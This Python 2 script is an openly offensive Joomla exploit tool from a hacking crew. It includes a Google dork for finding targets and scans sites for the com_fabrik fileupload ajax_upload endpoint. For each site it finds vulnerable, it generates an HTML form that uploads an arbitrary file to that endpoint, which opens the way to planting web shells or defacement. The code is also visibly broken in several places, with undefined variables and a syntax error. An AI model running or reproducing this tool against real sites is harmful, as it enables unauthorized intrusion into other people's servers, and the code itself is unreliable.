#!/bin/env python2
# Coded by Jinxpro.id
# Dibuat pada 17/11/2018
# Author : Firman.id
# gr33tz : IndoXploit - JakartaHunterCrew - B0mb3rSh0tz
#
#
#
#

import os
import sys
import time
import urllib2

def cls():
	if sys.platform == 'linux2':
		os.system("clear")
	else: 
		os.system("cls")

#vulnerability scanner

def scanner():

 if os.path.exists(web):
	pass
 else:
	print ''
	print '\033[1;39m[!] \033[1;31mFile tidak ditemukan.\033[1;39m'
	print ''
	return
 fi1 = open(web, "r")
 fi2 = fi1.readlines()
 fi1.close()

 for site in fi2:
 	site = site.rstrip()
	pooja = 
	while pooja <= len(site):
		pooja = pooja+1
		if pooja == len(site):
		   zz = pooja-1
		   if site[zz:pooja] == "/":
			neww = list(site)
			neww.pop()
			xx = "".join(neww)
			site = xx
	darsh = site + Payload
	try:
         try:
	  try:
           ajay = urllib2.urlopen(darsh).read()
	  except urllib2.HTTPError:
		 pass
	 except urllib2.URLError:
		pass
	 pat = "check.txt"
 	 if os.path.exists(pat):
        	 os.remove(pat)
         try:
 	  check1 = open("check.txt", "w")
 	  check1.write(ajay)
 	  check1.close()
	 except UnboundLocalError:
	  pass
 	 check = open("check.txt" , "r")
 	 check2 = check.read()
 	 check.close()

 	 vuln = open("vul.txt", "r")
 	 vu = vuln.read()
 	 vuln.close()
	
	 if check2 != vu:
		 print "\033[1;39m"
		 print site 
		 print check2
		 print "\033[1;31m[-] Website tidak vuln. Cari lagi sana\033[1;39m"
		 print ''
	 else:
		 print '\033[1;39m'
		 print site
		 print check2
		 print "\033[1;32m[+] Website vuln. Hajaar !\033[1;39m"
		 print ''
	except ValueError:
                pass

logo1 = '''
\033[1;33mWARNING :\033[1;39m Not Responding
\033[1;36m
'''
print logo1
print ''
x = raw_input("press enter to continue ...")

if sys.platform == 'linux2':
	os.system("clear")
else:
	os.system("cls")



logo2 = '''
Coded by Jinxpro.id | Indonesian Exploiter's

\t   |  |-------    __     _____  
\t   |  |       |  /  \   |       |   \033[1;39m VERSION : \033[1;32m1.4\033[1;39m
\t\033[1;36m   |  |       | |    |  |_____  |   \033[1;32m JOOMLA EXPLOIT\033[1;36m
\t   |  |       | |    |        | |_____
\t   |  |       | |    |        | |     |
\t|__/  |-------   \__/ \ ______| |     |

'''
print logo2
print "\033[1;31mDork :\033[1;39m inurl:index.php/component/fabrik/ site:\n\033[1;39m"
print "======>Gunakan Pemikiranmu Kawan<======"
def hlp():
 help= '''\033[1;39m
\t Commands      Description
\t\033[1;31m ========      ===========\033[1;39m
\t
\t -h/help       Help
\t lock url      lock url <isi target>
\t set file      set file <filename.txt>
\t clear         clear screen
\t scan          Scanner Com_Fabrik
\t run           Creates payload
\t about         MyDreams
\t exit          Exit
\t\033[1;39m
'''
 print help

main = ""
u = "< lock url >"
payload = "/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&plugin=fileupload&method=ajax_upload"
web = ""
while True:
	try:
	 cod = raw_input("\033[1;39mr00t#jinxpro.id-> \033[1;32m>>\033[1;32m ")
	 coder = cod.split()
	 if not coder:
                print "<\033[1;31minvalid command\033[1;39m>"
                continue
	 elif coder[0] == "help":
		hlp()
	 elif coder[0] == "scan":
		scanner()
	 elif coder[0] == "about":
		print '\033[1;39m'
		print '\t Nickname : Jinxpro.id'
		print '\t Country  : Indonesia'
		print '\t MyTeam.  : JakartaHunterCrew'
		print '\t Contact  : bodoamad91@gmail.com'
		print '\t Link FB  : https://www.facebook.com/FikriNetral7'
		print '\t'

	 elif coder[0] == "-h":
		hlp()
	 elif coder[0] == "exit":
		print "\033[1;39m"
		break
	 elif coder[0] == "set":
		if coder[1] == "url":
		 u = str(coder[2])
		 spu = 0
		 while spu <= len(u):
			spu = spu+1
			if spu == len(u):
			  san = spu-1
			  if u[san:spu] == "/":
				rakesh = list(u)
				rakesh.pop()
				neww = "".join(rakesh)
				u = neww
		elif coder[1] == "file":
		 web = str(coder[2])
		else:
		 print "<\033[1;31minvalid command\033[1;39m>"
		 pass
	 elif coder[0] == "exit":
		break
	 elif coder[0] == "run":
		if u == "":
			print ''
			print "[x] Please provide url"
			print ''
			continue 
		ur = u + payload
		try:
		 try:
		  main = urllib2.urlopen(ur).read()
		 except connection:
		  	pass
		except NameError:
		      print ''
		      print "[!] Something went wrong or test another site"
		      print ''
		      pass
		pat = "check.txt"
		if os.path.exists(pat):
			os.remove(pat)

		check1 = open("check.txt", "w")
		check1.write(main)
		check1.close()

		check = open("check.txt" , "r")
		check2 = check.read()
		check.close()

		vuln = open("vul.txt", "r")
		vu = vuln.read()
		vuln.close()
		
		print ''
		print check2

		if check2 != vu:
			print "\033[1;31m[-] Website tidak vuln. Cari lagi sana\033[1;39m"
			print ''
		else:
			print "[+] Website vuln. Hajaar !"
			jinxpro = "payload/index.html"

			if os.path.exists(jinxpro):
				os.remove(jinxpro)

			expl = open("payload/index.html" , "w")
			expl.write("<html><head> \n")
			expl.write("<title>Indonesia Exploiter's</title> \n")
			expl.write('</head><body background=""> \n')
			expl.write('<link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Amaranth"> \n')
			expl.write('<style> \n')
			expl.write('   body { \n')
			expl.write('   font-family:Amaranth; \n ')
			expl.write('   } \n')
			expl.write('</style> \n')
			expl.write('<center><br><br><br><br><br><br><br><br><br><br> \n')
			expl.write('<h1 style="color:green;">Joomla Exploit</h1> \n')
			expl.write('<form method="POST" action="'+ur+'" enctype="multipart/form-data"> \n')
			expl.write('<input type="file" name="file"><button>Exploit</button> \n')
			expl.write('</form> \n')
			expl.write('</<center></body></html> \n')
			expl.close()

			print ''

			bairamma = open("payload/index.html" , "r")
			boothappa = bairamma.read()
			bairamma.close()
			
			print ''
			print "\t\033[1;39m Payload "
			print "\t\033[1;31m ======="
			print ''
			print boothappa
			print ''
			print "\033[1;32mPayload generated in [ payload/index.html ] Enjoy...\033[1;39m"
			print ''

	 elif coder[0] == "show":
		if coder[1] == "options":
			print '\033[1;39m'
			print "\t Input Options"
			print '\t\033[1;31m =============\033[1;39m'
			print ""
			print '\t url :\033[1;32m ',u
			print '\033[1;39m'
		else:
			print "<\033[1;31minvalid command\033[1;39m>"
			pass
	 elif coder[0] == "clear":
		cls()
	 else:
		print "<\033[1;31minvalid command\033[1;39m>"
		continue
	except IndexError:
	 print "<\033[1;31minvalid command\033[1;39m>"
	 pass
